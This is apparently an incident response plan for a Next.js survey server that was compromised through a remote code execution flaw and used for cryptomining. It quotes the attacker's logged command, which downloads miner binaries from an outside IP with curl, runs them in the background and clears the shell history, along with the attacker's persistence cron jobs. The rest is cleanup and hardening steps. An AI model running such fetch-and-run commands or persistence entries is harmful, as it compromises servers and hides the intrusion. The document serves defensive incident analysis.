# Security Breach Analysis & Response Plan

## 🚨 CRITICAL: Server Compromised

**Date:** December 9-10, 2025  
**Vulnerability:** CVE-2025-55182 (React2Shell) - Remote Code Execution in Next.js/React  
**Status:** ACTIVE BREACH - Immediate action required

---

## Evidence of Compromise

### 1. Malicious Command Execution (Error Log Line 302)
```
rm -rf /etc/de && pkill cARM ; pkill cX86 ; mkdir /etc/de && 
curl -k -o /etc/de/cARM http://5.231.31.52/cARM && 
curl -k -o /etc/de/cX86 http://5.231.31.52/cX86 && 
chmod 777 /etc/de/c* ; 
nohup /etc/de/./cARM > /dev/null 2>&1 & 
nohup /etc/de/./cX86 > /dev/null l 2>&1 & 
disown && history -c
```

**What this does:**
- Downloads cryptominers from malicious IP `5.231.31.52`
- Executes them in background
- Clears command history to hide tracks

### 2. Active Malware Processes (searching-issue.txt)
- **Line 7:** Suspicious Node.js process: `/root/.local/share/.05bf0e9b/.4dai8ovb/bin/node`
- **Line 71:** Cryptominer script: `/root/c3pool/miner.sh`
- **Line 100-112:** Malware process crashed but was running

### 2b. Malware Binaries in Application Directory ⚠️ **CRITICAL FINDING**
- **`/var/www/survey-portal/apps/web/i386`** - 32-bit architecture cryptominer binaries
- **`/var/www/survey-portal/apps/web/amd64`** (or `am64`) - 64-bit architecture cryptominer binaries
- These are the actual cryptominer executables downloaded by the attacker
- **IMMEDIATE ACTION REQUIRED:** Remove these directories immediately

### 3. Persistence Mechanisms (Cron Jobs)
```
@daily /tmp/.esd101/./.b4nd1d0
@reboot /tmp/.esd101/./.b4nd1d0 > /dev/null 2>&1 & disown
* * * * * /tmp/.esd101/./.b4nd1d0 > /dev/null 2>&1 & disown  # Runs EVERY MINUTE
@reboot /etc/de/./cX86
```

### 4. Attack Vector
The error log shows:
- **Invalid header injection attempts:** `TypeError: Invalid character in header content ["x-action-redirect"]`
- **Command execution errors:** Multiple failed command executions
- **URL parsing errors:** Attempts to inject malicious URLs

**Root Cause:** CVE-2025-55182 (React2Shell) vulnerability in Next.js 15.4.2 allowing RCE through server actions/API routes.

---

## Immediate Actions Required

### Phase 1: Containment (DO THIS NOW)

1. **Stop all services:**
   ```bash
   pm2 stop all
   pm2 delete all
   ```

2. **Kill malicious processes:**
   ```bash
   pkill -f cARM
   pkill -f cX86
   pkill -f .b4nd1d0
   pkill -f "05bf0e9b"
   ```

3. **Remove cron jobs:**
   ```bash
   crontab -r  # Remove all cron jobs
   # Then manually verify and restore legitimate ones
   ```

4. **Block malicious IP:**
   ```bash
   iptables -A INPUT -s 5.231.31.52 -j DROP
   iptables -A OUTPUT -d 5.231.31.52 -j DROP
   ```

### Phase 2: Cleanup

1. **Remove malware files:**
   ```bash
   # ⚠️ CRITICAL: Remove cryptominer binaries from Next.js app directory FIRST
   cd /var/www/survey-portal/apps/web
   rm -rf i386
   rm -rf amd64
   rm -rf am64  # In case it's named am64 instead of amd64
   
   # Remove other malware locations
   rm -rf /etc/de
   rm -rf /tmp/.esd101
   rm -rf /root/.local/share/.05bf0e9b
   rm -rf /root/c3pool
   ```

2. **Check for other suspicious files:**
   ```bash
   find / -name "*.sh" -mtime -7 -exec ls -la {} \;
   find / -name "cARM" -o -name "cX86" -o -name ".b4nd1d0"
   find / -path "*/.*" -type f -mtime -7  # Hidden files modified recently
   ```

3. **Check network connections:**
   ```bash
   netstat -tulpn | grep -E "5.231.31.52|ESTABLISHED"
   ss -tulpn | grep -E "5.231.31.52|ESTABLISHED"
   ```

4. **Check systemd services:**
   ```bash
   systemctl list-units --type=service | grep -E "c3pool|5168631990d6"
   systemctl status 5168631990d6.service  # Malicious service from logs
   ```

### Phase 3: Patch & Secure

1. **Update Next.js immediately:**
   ```bash
   cd apps/web
   npm update next@latest  # Check for patches for CVE-2025-55182
   npm audit fix --force
   ```

2. **Review and harden server actions/API routes:**
   - Audit all server actions in `apps/web/app/**/actions.ts`
   - Audit all API routes in `apps/web/app/api/**`
   - Ensure no user input is executed as shell commands
   - Validate and sanitize all user inputs

3. **Add security headers:**
   - Implement Content Security Policy (CSP)
   - Add rate limiting
   - Implement request validation middleware

4. **Review environment variables:**
   - The `.env` format issue you fixed was correct
   - Ensure no sensitive data is exposed in logs
   - Rotate all secrets (JWT_SECRET, database passwords, etc.)

### Phase 4: Monitoring & Verification

1. **Set up monitoring:**
   ```bash
   # Monitor for suspicious processes
   watch -n 5 'ps aux | grep -E "curl|wget|node.*\.js" | grep -v grep'
   
   # Monitor network connections
   watch -n 5 'netstat -tulpn | grep ESTABLISHED'
   ```

2. **Check logs regularly:**
   ```bash
   tail -f /var/www/survey-portal/logs/web-error.log
   journalctl -f | grep -E "error|malware|suspicious"
   ```

3. **Verify no backdoors remain:**
   ```bash
   # Check for new cron jobs
   crontab -l
   ls -la /etc/cron.*
   
   # Check for new systemd services
   systemctl list-units --type=service --all
   
   # Check for new users
   cat /etc/passwd
   ```

---

## Code Vulnerabilities to Fix

### 1. Next.js Version
- **Current:** Next.js 15.4.2
- **Action:** Update to latest patched version that fixes CVE-2025-55182

### 2. Server Actions Security
Review all server-side code for:
- Unsanitized user input
- Command injection vulnerabilities
- Unsafe URL parsing
- Header injection vulnerabilities

### 3. Environment Variable Handling
The `.env` format issue you fixed was correct:
- ❌ Wrong: `NEXT_PUBLIC_SURVEY_SERVICE_URL: 'https://...'`
- ✅ Correct: `NEXT_PUBLIC_SURVEY_SERVICE_URL=https://...`

---

## Long-term Security Measures

1. **Implement WAF (Web Application Firewall)**
2. **Add intrusion detection (fail2ban, etc.)**
3. **Regular security audits**
4. **Automated vulnerability scanning**
5. **Backup and disaster recovery plan**
6. **Security monitoring and alerting**
7. **Regular security updates**

---

## Files to Review

1. `apps/web/app/**/actions.ts` - All server actions
2. `apps/web/app/api/**` - All API routes
3. `apps/web/next.config.js` - Next.js configuration
4. `ecosystem.config.js` - PM2 configuration
5. All `.env` files - Environment variables

---

## Questions to Answer

1. **When did the breach occur?** Check first occurrence in logs
2. **What data was accessed?** Review database access logs
3. **Are backups compromised?** Verify backup integrity
4. **Are other servers affected?** Check all servers in your infrastructure
5. **Should you notify users?** If PII/data was accessed, consider notification

---

## Next Steps

1. ✅ **IMMEDIATE:** Stop services and kill malicious processes
2. ✅ **IMMEDIATE:** Remove malware files and cron jobs
3. ✅ **URGENT:** Patch Next.js and review code
4. ✅ **URGENT:** Rotate all secrets
5. ⚠️ **SOON:** Full security audit
6. ⚠️ **SOON:** Implement monitoring

---

**⚠️ WARNING:** Do NOT restart services until you have:
1. Removed all malware
2. Patched the vulnerability
3. Hardened the application
4. Verified no backdoors remain

**This is a critical security incident. Treat it as such.**

